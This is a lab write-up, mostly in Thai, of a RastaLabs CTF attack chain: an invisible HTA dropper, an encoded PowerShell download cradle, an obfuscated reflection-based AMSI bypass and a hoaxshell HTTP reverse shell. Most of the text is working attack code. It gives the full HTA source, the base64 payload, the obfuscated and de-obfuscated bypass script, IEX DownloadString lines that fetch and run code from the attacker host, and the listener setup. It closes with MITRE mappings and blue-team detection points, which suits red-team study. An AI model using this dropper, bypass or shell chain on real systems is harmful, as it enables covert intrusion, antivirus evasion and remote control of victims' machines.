# RastaLabs Writeup — HTA Dropper → AMSI Bypass → hoaxshell

> Lab writeup — authorized lab/CTF environment เท่านั้น

---

## ภาพรวม Kill Chain

```
┌──────────────────────────────────────────────────────────────────┐
│  ATTACKER (Kali / 10.10.16.24)                                   │
│                                                                   │
│  1. Host own.ps1 + hoaxshell payload (python HTTP server)         │
│  2. สร้าง file.hta → ส่งให้เหยื่อ (social engineering / upload)  │
│  3. รอรับ reverse shell ผ่าน hoaxshell                            │
└───────────────────────────┬──────────────────────────────────────┘
                            │  victim เปิด .hta
                            ▼
┌──────────────────────────────────────────────────────────────────┐
│  VICTIM (Windows)                                                 │
│                                                                   │
│  Step 1: mshta.exe เปิด file.hta                                 │
│     └─ VBScript สร้าง Wscript.Shell                               │
│     └─ .run powershell.exe -e <base64> (hidden window)            │
│                                                                   │
│  Step 2: PowerShell decode base64 → ได้:                          │
│     IEX((New-Object Net.WebClient).DownloadString(                │
│       'http://10.10.16.24/own.ps1'))                              │
│     └─ ดาวน์โหลด own.ps1 จาก attacker                            │
│                                                                   │
│  Step 3: own.ps1 execute →                                        │
│     └─ AMSI bypass (Reflection → amsiInitFailed = true)           │
│     └─ ดาวน์โหลด + execute hoaxshell จาก /a                      │
│                                                                   │
│  Step 4: hoaxshell ← HTTP-based reverse shell กลับไป attacker     │
└──────────────────────────────────────────────────────────────────┘
```

---

## Stage 1 — file.hta (Initial Access Dropper)

### Source Code

```html
<!DOCTYPE html>
<html>
<head>
<HTA:APPLICATION icon="#" WINDOWSTATE="minimize" SHOWINTASKBAR="no"
SYSMENU="no" CAPTION="no" />
<script language="VBScript">
Function var_func()
    Dim var_shell
    Set var_shell = CreateObject("Wscript.Shell")
    var_shell.run "powershell.exe -e [base64]", 0, true
End Function
var_func
self.close
</script>
</head>
<body></body>
</html>
```

### วิเคราะห์ HTA:APPLICATION Attributes

| Attribute | ค่า | ผลลัพธ์ |
|---|---|---|
| `WINDOWSTATE="minimize"` | ย่อหน้าต่างทันที | เหยื่อไม่เห็นหน้าต่าง HTA โผล่ |
| `SHOWINTASKBAR="no"` | ไม่แสดงใน taskbar | ไม่มี icon ให้เหยื่อเห็น |
| `SYSMENU="no"` | ไม่มี system menu (close/minimize) | ป้องกันเหยื่อปิด |
| `CAPTION="no"` | ไม่มี title bar | ไม่มีชื่อหน้าต่างให้เห็น |
| `icon="#"` | icon ว่าง | ไม่มี icon แสดง |

→ **สรุป**: HTA ทำงานแบบ "invisible" — เหยื่อแทบไม่รู้ว่ามีอะไรรัน

### วิเคราะห์ VBScript

| บรรทัด | ทำอะไร |
|---|---|
| `CreateObject("Wscript.Shell")` | สร้าง COM object สำหรับรัน command |
| `.run "powershell.exe -e ...", 0, true` | รัน PowerShell; **`0`** = hidden window; **`true`** = wait for completion |
| `powershell.exe -e` | **`-EncodedCommand`** — รับ base64-encoded UTF-16LE command |
| `var_func` | เรียก function ทันที |
| `self.close` | ปิด HTA หลังรันเสร็จ — ลบ trace |

### Base64 Payload Decode

Base64 (UTF-16LE):
```
SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMgA0AC8AbwB3AG4ALgBwAHMAMQAnACkAKQA=
```

Decoded:
```
IEX((New-Object Net.WebClient).DownloadString('http://10.10.16.24/own.ps1'))
```

### ทำไมใช้ HTA

- HTA รันผ่าน `mshta.exe` ซึ่งเป็น **signed Microsoft binary** (LOLBIN)
- HTA มี **full trust** — ไม่อยู่ใน browser sandbox
- สามารถเรียก COM objects, ActiveX, WScript ได้ครบ
- ส่งทาง email หรือ host บน web ได้ (social engineering)
- **Mark of the Web (MOTW)**: HTA ที่ถูก download จะมี MOTW → Windows อาจแจ้งเตือน แต่ถ้าเหยื่อกด "Run" ก็ execute ได้

### ทำไมใช้ -EncodedCommand

- หลีกเลี่ยงปัญหา special characters ใน command line
- ซ่อน command จาก casual inspection (ต้อง decode ถึงจะอ่านออก)
- **แต่**: command line logging (Event ID 4688, Sysmon Event ID 1) จะเห็น base64 string — blue team decode ได้ทันที

---

## Stage 2 — own.ps1 (AMSI Bypass) — วิเคราะห์ทีละบรรทัด

### Full Source (obfuscated)

```powershell
$e=[Ref].('Assem'+'bly').('Ge'+'t'+'Ty'+'pe')(([string]::Join('',[char[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))))
$n='Non'+'Public'
$s='Static'
$f=$e.('Ge'+'t'+'Fi'+'eld')(([string]::Join('',[char[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100))),($n+','+$s))
$t=[type[]]@([object],[bool])
$m=$e.('Ge'+'t'+'Me'+'tho'+'d')('Se'+'t'+'Val'+'ue',$t)
$m.('In'+'vo'+'k'+'e')($f,@($null,$true))
IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.16.24/a'))
```

### Full Source (de-obfuscated)

```powershell
$e = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$n = 'NonPublic'
$s = 'Static'
$f = $e.GetField('amsiInitFailed', 'NonPublic,Static')
$t = [type[]]@([object],[bool])
$m = $e.GetMethod('SetValue', $t)
$m.Invoke($f, @($null, $true))
IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.16.24/a'))
```

---

### บรรทัดที่ 1: หา AmsiUtils class

```powershell
$e=[Ref].('Assem'+'bly').('Ge'+'t'+'Ty'+'pe')(
    ([string]::Join('',[char[]](83,121,115,116,101,109,46,77,97,110,97,
    103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,
    46,65,109,115,105,85,116,105,108,115)))
)
```

**De-obfuscated**: `$e = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')`

**Obfuscation layers**:

| Layer | ตัวอย่าง | ทำไม |
|---|---|---|
| **String concatenation** | `'Assem'+'bly'` | ซ่อน keyword `Assembly` จาก AMSI signature |
| **Dot-string invocation** | `[Ref].('Assem'+'bly')` | เรียก property ผ่าน string — AMSI จับ pattern ยากกว่า `.Assembly` ตรง ๆ |
| **Char array + Join** | `[char[]](83,121,...) + Join` | ซ่อน `System.Management.Automation.AmsiUtils` |

**Char array decode ทีละส่วน**:
```
[83,121,115,116,101,109]                                   → "System"
[46]                                                        → "."
[77,97,110,97,103,101,109,101,110,116]                      → "Management"
[46]                                                        → "."
[65,117,116,111,109,97,116,105,111,110]                     → "Automation"
[46]                                                        → "."
[65,109,115,105,85,116,105,108,115]                         → "AmsiUtils"

= "System.Management.Automation.AmsiUtils"
```

**`System.Management.Automation.AmsiUtils` คืออะไร**:
- เป็น **internal class** ใน PowerShell engine (`System.Management.Automation.dll`)
- มี field `amsiInitFailed` (private static bool) ที่บอกว่า AMSI initialize สำเร็จหรือไม่
- ถ้า `amsiInitFailed = true` → PowerShell **ข้าม AMSI scan ทั้งหมด**
- เป็น Non-Public class → ต้องใช้ Reflection เท่านั้นถึงจะเข้าถึงได้

---

### บรรทัดที่ 2–3: เตรียม BindingFlags

```powershell
$n='Non'+'Public'    # → "NonPublic"
$s='Static'          # → "Static"
```

**ทำไมต้อง split**: string `"NonPublic"` ตัวเดียวอาจถูก AMSI จับเป็น pattern ของ Reflection-based bypass

**BindingFlags คืออะไร**: .NET ใช้ BindingFlags เพื่อบอกว่าจะเข้าถึง member แบบไหน:
- `NonPublic` = เข้าถึง private/internal members
- `Static` = เข้าถึง static members (ไม่ต้อง instance)
- รวมกัน: `"NonPublic,Static"` → เข้าถึง private static field ได้

---

### บรรทัดที่ 4: หา amsiInitFailed field

```powershell
$f=$e.('Ge'+'t'+'Fi'+'eld')(
    ([string]::Join('',[char[]](97,109,115,105,73,110,105,116,
    70,97,105,108,101,100))),
    ($n+','+$s)
)
```

**De-obfuscated**: `$f = $e.GetField('amsiInitFailed', 'NonPublic,Static')`

**Char array decode**:
```
[97,109,115,105]           → "amsi"
[73,110,105,116]           → "Init"
[70,97,105,108,101,100]    → "Failed"

= "amsiInitFailed"
```

**`$f` ตอนนี้คือ**: FieldInfo object ที่ชี้ไปยัง `AmsiUtils.amsiInitFailed` — ยังไม่ได้แก้ค่า

---

### บรรทัดที่ 5–6: เตรียม SetValue method

```powershell
$t=[type[]]@([object],[bool])
$m=$e.('Ge'+'t'+'Me'+'tho'+'d')('Se'+'t'+'Val'+'ue',$t)
```

**De-obfuscated**: `$m = $e.GetMethod('SetValue', [type[]]@([object],[bool]))`

**String concatenations ที่ซ่อน**:
- `'Ge'+'t'+'Me'+'tho'+'d'` → `GetMethod`
- `'Se'+'t'+'Val'+'ue'` → `SetValue`

**ทำไมไม่ใช้ `$f.SetValue($null, $true)` ตรง ๆ**:
- เพราะ `.SetValue` ถูก AMSI flag → ต้องหา method object ผ่าน `GetMethod` แล้ว `Invoke` แทน
- `$t` กำหนด parameter types `(object, bool)` เพื่อเลือก overload ที่ถูกต้อง

---

### บรรทัดที่ 7: Invoke — Set amsiInitFailed = true

```powershell
$m.('In'+'vo'+'k'+'e')($f,@($null,$true))
```

**De-obfuscated**: `$m.Invoke($f, @($null, $true))`

**String concatenation**: `'In'+'vo'+'k'+'e'` → `Invoke`

**Parameters**:
- `$f` = FieldInfo ของ `amsiInitFailed`
- `$null` = target object (null เพราะเป็น static field)
- `$true` = ค่าใหม่ที่จะ set

→ **`AmsiUtils.amsiInitFailed = true`** → **AMSI ถูกปิดตลอด PowerShell session นี้**

---

### บรรทัดที่ 8: โหลด payload

```powershell
IEX((New-Object System.Net.WebClient).DownloadString('http://10.10.16.24/a'))
```

- `New-Object System.Net.WebClient` → สร้าง HTTP client
- `.DownloadString('http://10.10.16.24/a')` → ดาวน์โหลด hoaxshell script จาก attacker
- `IEX(...)` (Invoke-Expression) → execute ทันที
- **ปลอดภัย** เพราะ AMSI ถูกปิดแล้ว → AV จะไม่ scan content ที่โหลดมา

---

## Stage 3 — hoaxshell (HTTP-based Reverse Shell)

### หลักการทำงาน

```
┌─────────────┐          HTTP GET (poll for commands)         ┌──────────────┐
│   VICTIM    │ ─────────────────────────────────────────────→│   ATTACKER   │
│  PowerShell │                                               │  hoaxshell   │
│   payload   │ ←─────────────────────────────────────────────│   server     │
│             │          HTTP response (command)              │              │
│             │                                               │              │
│             │          HTTP POST (command output)           │              │
│             │ ─────────────────────────────────────────────→│              │
└─────────────┘                                               └──────────────┘
```

### ทำไมใช้ hoaxshell

- **HTTP traffic** → ผ่าน firewall ได้ง่าย (port 80/443 มักเปิด)
- **ดูเหมือน web traffic ปกติ** → IDS/IPS จับยาก
- **ไม่ต้องใช้ nc/socat** → ลด dependency
- **Fileless** — payload อยู่ใน memory เท่านั้น ไม่เขียนลงดิสก์
- **ง่ายในการ setup** — แค่รัน python script ฝั่ง attacker

### Attacker Setup (ฝั่ง Kali)

```bash
# 1. Host the AMSI bypass script
python3 -m http.server 80
# own.ps1 + payload /a อยู่ใน directory เดียวกัน

# 2. Start hoaxshell listener
python3 hoaxshell.py -s 10.10.16.24
```

---

## MITRE ATT&CK Mapping

| Step | ที่ไหน | ทำอะไร | Technique ID |
|---|---|---|---|
| 1 | Victim เปิด file.hta | mshta.exe รัน VBScript | **T1218.005** — Mshta |
| 2 | VBScript | `CreateObject("Wscript.Shell")` | **T1059.005** — VBScript |
| 3 | VBScript | `.run powershell -e <base64>` (hidden) | **T1059.001** — PowerShell |
| 4 | PowerShell | Download own.ps1 | **T1105** — Ingress Tool Transfer |
| 5 | own.ps1 | Reflection → `amsiInitFailed = true` | **T1562.001** — Disable or Modify Tools |
| 6 | own.ps1 | Download + execute hoaxshell | **T1105** — Ingress Tool Transfer |
| 7 | hoaxshell | HTTP-based reverse shell | **T1071.001** — Web Protocols |

---

## Blue Team Detection Points

| Detection Point | วิธีตรวจจับ | Evidence |
|---|---|---|
| **mshta.exe execution** | Sysmon Event ID 1 — process creation | Command line มี .hta path |
| **PowerShell -EncodedCommand** | Event ID 4688 / Sysmon 1 — จับ `-e` flag | Decode base64 → เห็น DownloadString |
| **Script Block Logging** | PowerShell Event ID 4104 | เห็น AmsiUtils, amsiInitFailed (ถ้า logging ทำงานก่อน bypass) |
| **Network traffic** | HTTP to external IP | URL: `GET /own.ps1`, `GET /a` |
| **AMSI event failure** | Windows Event — AMSI scan failure | AMSI stopped producing scan results |
| **hoaxshell C2** | HTTP beaconing pattern | Regular interval GET requests |

---

## Obfuscation Technique สรุปรวม

```
┌──────────────────────────────────────────────────────────────────┐
│  Obfuscation Layer Stack ที่ใช้ใน own.ps1                        │
├──────────────────────────────────────────────────────────────────┤
│                                                                   │
│  Layer 1: String Concatenation                                    │
│  ├─ 'Assem'+'bly'           → Assembly                           │
│  ├─ 'Ge'+'t'+'Ty'+'pe'      → GetType                           │
│  ├─ 'Ge'+'t'+'Fi'+'eld'     → GetField                          │
│  ├─ 'Non'+'Public'          → NonPublic                          │
│  ├─ 'Ge'+'t'+'Me'+'tho'+'d' → GetMethod                         │
│  ├─ 'Se'+'t'+'Val'+'ue'     → SetValue                          │
│  └─ 'In'+'vo'+'k'+'e'       → Invoke                            │
│                                                                   │
│  Layer 2: Char Array + String.Join                                │
│  ├─ [char[]](83,121,...) → System.Management.Automation.AmsiUtils│
│  └─ [char[]](97,109,...) → amsiInitFailed                        │
│                                                                   │
│  Layer 3: Dot-String Method Invocation                            │
│  ├─ $e.('GetField')(...) แทน $e.GetField(...)                    │
│  └─ ทำให้ AMSI ไม่เห็น direct method call pattern                │
│                                                                   │
│  Layer 4: Indirect Invocation via GetMethod + Invoke              │
│  └─ ใช้ GetMethod('SetValue') + Invoke แทน call .SetValue ตรง    │
│                                                                   │
│  Layer 5: Variable Splitting                                      │
│  └─ แยก BindingFlags ออกเป็น $n, $s แล้วรวมด้วย +','+ ทีหลัง    │
│                                                                   │
└──────────────────────────────────────────────────────────────────┘
```
